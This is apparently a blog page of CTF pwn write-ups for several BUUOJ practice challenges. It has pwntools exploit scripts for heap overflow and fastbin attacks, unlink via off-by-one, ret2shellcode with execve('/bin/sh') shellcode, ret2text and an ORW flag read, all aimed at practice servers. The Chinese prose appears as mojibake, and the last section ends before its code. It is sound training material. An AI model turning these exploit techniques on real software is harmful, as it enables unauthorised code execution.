<h2 id="0x053-hitcontraining-unlink-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><a href="#0x053-hitcontraining-unlink-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force" class="headerlink" title="0x053.hitcontraining_unlink - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force"></a>0x053.hitcontraining_unlink - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</h2><p>å’Œ 0x04B <strong>ä¸€  æ¨¡  ä¸€  æ ·</strong> çš„é¢˜ç›®ï¼Œå°±ä¸èµ˜å™äº†</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29142</span>)<span class="comment">#process(&#x27;./bamboobox&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x40</span>, p64(<span class="number">0x21</span>) * <span class="number">6</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>)) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    dump()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 3, overlappnig with idx 2</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x40</span>, <span class="string">b&#x27;arttnba5&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">3</span>, <span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + <span class="number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/FLpTbPhsGCnvrUt.png" alt="image.png"></p>
<h2 id="0x054-ciscn-2019-s-9-ret2shellcode"><a href="#0x054-ciscn-2019-s-9-ret2shellcode" class="headerlink" title="0x054.ciscn_2019_s_9 - ret2shellcode"></a>0x054.ciscn_2019_s_9 - ret2shellcode</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³</p>
<p><img src="https://i.loli.net/2021/04/07/HqfgXAWpiUjk1OY.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥æœ‰ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/07/6tZ3AgBPuoizekx.png" alt="image.png"></p>
<p>æœ‰ä¸ª gadgetï¼Œé‚£å°±ç›´æ¥ret2shellcodeå³å¯</p>
<p><img src="https://i.loli.net/2021/04/07/A8WbMRVTQFJP4rN.png" alt="image.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26398</span>)<span class="comment">#process(&#x27;./ciscn_s_9&#x27;)#</span></span><br><span class="line">jmp_esp = <span class="number">0x8048554</span></span><br><span class="line">sc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,0xB</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = asm(sc).ljust(<span class="number">0x24</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(jmp_esp) + asm(<span class="string">&#x27;sub esp, 0x28 ; jmp esp&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/07/uLq9ralZIK78CB5.png" alt="image.png"></p>
<h2 id="0x055-axb-2019-heap-off-by-one-unlink"><a href="#0x055-axb-2019-heap-off-by-one-unlink" class="headerlink" title="0x055.axb_2019_heap - off by one + unlink"></a>0x055.axb_2019_heap - off by one + unlink</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿ æŠ¤ å…¨ å¼€</p>
<p><img src="https://i.loli.net/2021/04/07/LzdZR8pCbBateXu.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯çŸ¥è¯¥ç¨‹åºæœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½ï¼ˆæ‰“å°åŠŸèƒ½æ— æ•ˆï¼‰</p>
<p><img src="https://i.loli.net/2021/04/07/3VCwPf9mHoFjOGx.png" alt="image.png"></p>
<p>å¼€å¤´æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ³„éœ²ä¿å­˜åœ¨æ ˆä¸Šçš„libcç›¸å…³åœ°å€ï¼ˆmainè¿”å›å€¼ï¼‰ä¸ç¨‹åºçš„åŠ è½½åœ°å€ï¼Œä»è€Œç›´æ¥è·å¾—ä¿å­˜å †æŒ‡é’ˆçš„åœ°å€</p>
<p><img src="https://i.loli.net/2021/04/07/xF9LPMJ3zZUHcn2.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/04/07/mwgR4uexdo9tbPD.png" alt="image.png"></p>
<p>åˆ›å»ºå †å—æ—¶é™åˆ¶äº†æˆ‘ä»¬åªèƒ½åˆ›å»º 0x80 ä»¥ä¸Šçš„ï¼Œè¯´æ˜è¿™æ¬¡è¦ç»•è¿‡fastbinå’Œbinsæ•°ç»„æ­£é¢åˆšï¼ˆ</p>
<p><img src="https://i.loli.net/2021/04/07/LsZyU6khAg8ei4I.png" alt="image.png"></p>
<p>åˆ›å»ºå’Œç¼–è¾‘éƒ½å­˜åœ¨ä¸€ä¸ª off by one æ¼æ´</p>
<p><img src="https://i.loli.net/2021/04/07/GDfipkOI1JL9Z3y.png" alt="image.png"></p>
<p>è€ƒè™‘é€šè¿‡ unlink åŠ«æŒ note æ•°ç»„ï¼Œä¹‹åå°±æ˜¯å¸¸è§„æµç¨‹</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25780</span>)<span class="comment">#process(&#x27;./axb_2019_heap&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line">heap_array = <span class="number">0x202060</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter the index you want to create (0-10):&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter a size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter the content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter an index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter an index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter the content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;%15$p.%19$p&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Hello, &quot;</span>)</span><br><span class="line">    libc_base = (<span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;.&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    elf_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;elf base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        new(i, <span class="number">0xf8</span>, <span class="string">b&#x27;arttnba3\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">1</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64(elf_base + heap_array - <span class="number">0x8</span>) + p64(elf_base + heap_array)).ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0xf0</span>) + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(<span class="number">0x100</span>) + p64(elf_base + heap_array) + p64(<span class="number">0x100</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(<span class="number">0x100</span>) + p64(elf_base + heap_array) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/08/a2riTjb4QpodKmE.png" alt="image.png"></p>
<h2 id="0x056-mrctf2020-easy-equation-ret2text"><a href="#0x056-mrctf2020-easy-equation-ret2text" class="headerlink" title="0x056.mrctf2020_easy_equation - ret2text"></a>0x056.mrctf2020_easy_equation - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/04/08/uYI1yXk9EVhw7Pe.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>æœ‰æº¢å‡ºï¼Œæœ‰åé—¨ï¼Œç›´æ¥å¾€åé—¨æº¢å°±å®Œäº‹äº†ï¼Œä»€ä¹ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹ç±»çš„éƒ½æ— å…³ç´§è¦ï¼ˆ</p>
<p><img src="https://i.loli.net/2021/04/08/vBy6O9ojWlJmsEU.png" alt="image.png"></p>
<p>æ„é€  exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26947</span>)<span class="comment">#process(&#x27;./mrctf2020_easy_equation&#x27;)#</span></span><br><span class="line">backdoor = <span class="number">0x4006D0</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> + p64(backdoor) * <span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/04/08/y28bHUrKnWzgRFi.png" alt="image.png"></p>
<blockquote>
<p>è‡³æ­¤ï¼ŒBUUOJä¸ŠPwnæ–¹å‘åˆ†æ•°ä¸º <code>1</code> åˆ†çš„é¢˜ç›®å…¨éƒ¨å®Œç»“ï¼Œæ€»è®¡ <code>91</code> é“é¢˜ç›®</p>
</blockquote>
<h2 id="0x057-bad-ret2shellcode"><a href="#0x057-bad-ret2shellcode" class="headerlink" title="0x057.bad - ret2shellcode"></a>0x057.bad - ret2shellcode</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œä¿æŠ¤å…¨å…³</p>
<p><img src="https://i.loli.net/2021/04/19/WEtqO1JgsmdzCMP.png" alt="image.png"></p>
<p>å¼€äº†æ²™ç®±ï¼Œåº”è¯¥åªèƒ½orw</p>
<p><img src="https://i.loli.net/2021/04/19/i4XTr81SupyY6WN.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç›´æ¥å°±æœ‰ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2021/04/19/fR4hswvixn5KbgW.png" alt="image.png"></p>
<p>ä¸€ä¸ªå¾ˆè´´å¿ƒçš„gadget</p>
<p><img src="https://i.loli.net/2021/04/19/6AZCRoifMHQLuDY.png" alt="image.png"></p>
<p>å†™æ®µshellcodeè¿›è¡Œorwå³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28870</span>)<span class="comment">#process(&#x27;./bad&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bad&#x27;</span>)</span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">jmp_rsp = e.search(asm(<span class="string">&#x27;jmp rsp&#x27;</span>)).__next__()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1 = (asm(shellcraft.read(<span class="number">0</span>, <span class="number">0x601500</span>, <span class="number">100</span>) + <span class="string">&#x27;mov rax, 0x601500 ; jmp rax&#x27;</span>)).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;A&#x27;</span>) + p64(jmp_rsp) + asm(<span class="string">&#x27;sub rsp, 0x30 ; jmp rsp&#x27;</span>)</span><br><span class="line">shellcode = shellcraft.read(<span class="number">0</span>, <span class="number">0x601600</span>, <span class="number">100</span>) + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x601600</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="number">0x601600</span>,<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/04/19/YmsaDi5Z1MSc6Hj.png" alt="image.png"></p>
<h2 id="0x058-picoctf-2018-leak-me-leak"><a href="#0x058-picoctf-2018-leak-me-leak" class="headerlink" title="0x058.picoctf_2018_leak_me - leak"></a>0x058.picoctf_2018_leak_me - leak</h2><p>æ‹–å…¥ IDA ä¸­åˆ†æï¼Œä¸¤æ¬¡è¿æ¥ï¼Œç¬¬ä¸€æ¬¡è¾“256å­—ç¬¦æ³„æ¼å‡º passwordï¼Œç¬¬äºŒæ¬¡å†è¾“å…¥ password å³å¯è·å¾— flag</p>
<p><img src="https://i.loli.net/2021/05/02/vU17QASDiJu3lsB.png" alt="image.png"></p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26788</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">256</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">passwd = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.close()</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26788</span>)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.sendline(passwd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾—flag</p>
<p><img src="https://i.loli.net/2021/05/02/H1nfb78XC4ka5pg.png" alt="image.png"></p>
<h2 id="0x059-oneshot-tjctf-2016-one-gadget"><a href="#0x059-oneshot-tjctf-2016-one-gadget" class="headerlink" title="0x059.oneshot_tjctf_2016 - one_gadget"></a>0x059.oneshot_tjctf_2016 - one_gadget</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX</p>
<p><img src="https://i.loli.net/2021/05/03/Jc8amUqOyIjMTr4.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>ç»™ä¸€ä¸ªä»»æ„è¯»å’Œè·³è½¬ï¼Œé‚£å°±è¯» got è¡¨è·³ one_gadget å³å¯</p>
<p><img src="https://i.loli.net/2021/05/03/1LdXls2cHeFiVaO.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
